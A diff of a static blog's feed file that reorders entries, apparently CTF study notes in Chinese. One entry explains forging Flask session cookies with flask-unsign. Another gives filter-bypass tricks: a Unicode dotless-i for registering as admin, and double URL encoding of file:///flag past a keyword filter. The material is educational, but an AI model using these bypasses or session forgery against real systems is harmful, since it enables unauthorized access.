-    <content type="html"><![CDATA[<p>flask框架中的session由三部分组成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># session示例</span><br><span class="hljs-attribute">eyJhZG1pbiI6MH0</span>.Z4TvGQ.<span class="hljs-number">6</span>pZj4EsHiALdBjTc_STIl9XRU5Q<br></code></pre></td></tr></table></figure><p><strong>第一部分</strong>是base64编码的结果, 这里解码后就是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>第二部分</strong> 时间戳，说明session时间长会过期<br><strong>第三部分</strong><br>对数据和时间戳hmac</p><p>session工作流程</p><ol><li>用户访问，服务端给标示（如{“admin”:0}）、uid，对这些数据进行认证，附加到session字符串中</li><li>用户带着session字符串访问服务端，服务器对session进行认证，与原有mac进行比较。相同则认证成功。</li></ol><p>解题流程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">flask-unsign -d -c COOKIE<br>flask-unsign -s -c COOKIE --secret SECRET<br></code></pre></td></tr></table></figure><p>或者用<a href="https://github.com/mekrina/flask-unsign-gui.git">GUI版</a></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>flask</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>php特性</title>
     <link href="/blogs/php/php%E7%89%B9%E6%80%A7/"/>
     <url>/blogs/php/php%E7%89%B9%E6%80%A7/</url>
@@ -268,6 +249,25 @@
     <categories>
       
       <category>php</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>flask session伪造</title>
+    <link href="/blogs/flask/python%20session%E4%BC%AA%E9%80%A0/"/>
+    <url>/blogs/flask/python%20session%E4%BC%AA%E9%80%A0/</url>
+    
+    <content type="html"><![CDATA[<p>flask框架中的session由三部分组成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># session示例</span><br><span class="hljs-attribute">eyJhZG1pbiI6MH0</span>.Z4TvGQ.<span class="hljs-number">6</span>pZj4EsHiALdBjTc_STIl9XRU5Q<br></code></pre></td></tr></table></figure><p><strong>第一部分</strong>是base64编码的结果, 这里解码后就是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>第二部分</strong> 时间戳，说明session时间长会过期<br><strong>第三部分</strong><br>对数据和时间戳hmac</p><p>session工作流程</p><ol><li>用户访问，服务端给标示（如{“admin”:0}）、uid，对这些数据进行认证，附加到session字符串中</li><li>用户带着session字符串访问服务端，服务器对session进行认证，与原有mac进行比较。相同则认证成功。</li></ol><p>解题流程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">flask-unsign -d -c COOKIE<br>flask-unsign -s -c COOKIE --secret SECRET<br></code></pre></td></tr></table></figure><p>或者用<a href="https://github.com/mekrina/flask-unsign-gui.git">GUI版</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>flask</category>
       
     </categories>
     
@@ -328,25 +328,6 @@
   
   
   <entry>
-    <title>tricks</title>
-    <link href="/blogs/tricks/tricks/"/>
-    <url>/blogs/tricks/tricks/</url>
-    
-    <content type="html"><![CDATA[<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>‘ ı ‘, 不等于i，但是大写等于大写的I，这在注册时过滤admin后转大写时，可以起到注册admin的作用</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">```<span class="language-javascript">javascript</span><br><span class="language-javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-string">&#x27;A&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j++)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> s = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(j);</span><br><span class="language-javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10FFFF</span>; i++) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> e = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(i);</span><br><span class="language-javascript"><span class="hljs-keyword">if</span> (s == e.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; s != e) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;char: &quot;</span>+e+<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript">&#125;;</span><br></code></pre></td></tr></table></figure><h2 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h2><p>当先过滤再url解码时有用<br>比如网页有curl功能，访问file:&#x2F;&#x2F;&#x2F;flag即可得到flag，但是flag被过滤了，这时可以利用url编码，file:&#x2F;&#x2F;&#x2F;%66%6c%61%67，进行绕过。curl的时候由于可以访问url编码后的网页<br>浏览器搜索框和burpsuite会自动对url进行解码一次，因此在这二者中需要多编码一次。变成<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567，即对%进行编码，其实编码第一个%即可，因为这样后端收到的就是 file:&#x2F;&#x2F;&#x2F;%66lag 了，自然可以绕过。</p><p>2025&#x2F;3&#x2F;2 edit:</p><p>burpsuite和浏览器不会对url进行解码,而是访问php页面,存储到get或者post数组时会解码一次.<br>而$_SERVER[‘QUERY_STRING’]不会进行解码</p><p>python中requests会自动对请求进行url编码(encode)</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>tricks</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>xss</title>
     <link href="/blogs/xss/xss/"/>
     <url>/blogs/xss/xss/</url>
@@ -357,6 +338,25 @@
     <categories>
       
       <category>xss</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>tricks</title>
+    <link href="/blogs/tricks/tricks/"/>
+    <url>/blogs/tricks/tricks/</url>
+    
+    <content type="html"><![CDATA[<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>‘ ı ‘, 不等于i，但是大写等于大写的I，这在注册时过滤admin后转大写时，可以起到注册admin的作用</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">```<span class="language-javascript">javascript</span><br><span class="language-javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-string">&#x27;A&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j++)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> s = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(j);</span><br><span class="language-javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10FFFF</span>; i++) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> e = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(i);</span><br><span class="language-javascript"><span class="hljs-keyword">if</span> (s == e.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; s != e) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;char: &quot;</span>+e+<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript">&#125;;</span><br></code></pre></td></tr></table></figure><h2 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h2><p>当先过滤再url解码时有用<br>比如网页有curl功能，访问file:&#x2F;&#x2F;&#x2F;flag即可得到flag，但是flag被过滤了，这时可以利用url编码，file:&#x2F;&#x2F;&#x2F;%66%6c%61%67，进行绕过。curl的时候由于可以访问url编码后的网页<br>浏览器搜索框和burpsuite会自动对url进行解码一次，因此在这二者中需要多编码一次。变成<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567，即对%进行编码，其实编码第一个%即可，因为这样后端收到的就是 file:&#x2F;&#x2F;&#x2F;%66lag 了，自然可以绕过。</p><p>2025&#x2F;3&#x2F;2 edit:</p><p>burpsuite和浏览器不会对url进行解码,而是访问php页面,存储到get或者post数组时会解码一次.<br>而$_SERVER[‘QUERY_STRING’]不会进行解码</p><p>python中requests会自动对请求进行url编码(encode)</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>tricks</category>
       
     </categories>
     
